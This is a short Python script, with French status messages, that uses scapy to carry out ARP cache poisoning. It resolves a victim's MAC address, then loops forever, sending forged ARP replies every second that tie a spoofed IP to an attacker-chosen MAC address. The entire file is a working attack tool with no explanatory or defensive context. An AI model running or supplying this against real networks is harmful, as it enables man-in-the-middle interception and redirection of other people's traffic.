import sys
import time
from scapy.all import *

victim_ip = sys.argv[1]
fake_ip = sys.argv[2]

victim_mac = getmacbyip(victim_ip)
print(f"[*] MAC victime : {victim_mac}")

while True:
    pkt = (
        Ether(dst=victim_mac, src="08:00:27:03:c5:94") /
        ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip, hwsrc="08:00:27:03:c5:94")
    )
    sendp(pkt, iface="eth0", verbose=False)
    print(f"[+] ARP poison envoyé : {fake_ip} -> 08:00:27:03:c5:94")
    time.sleep(1)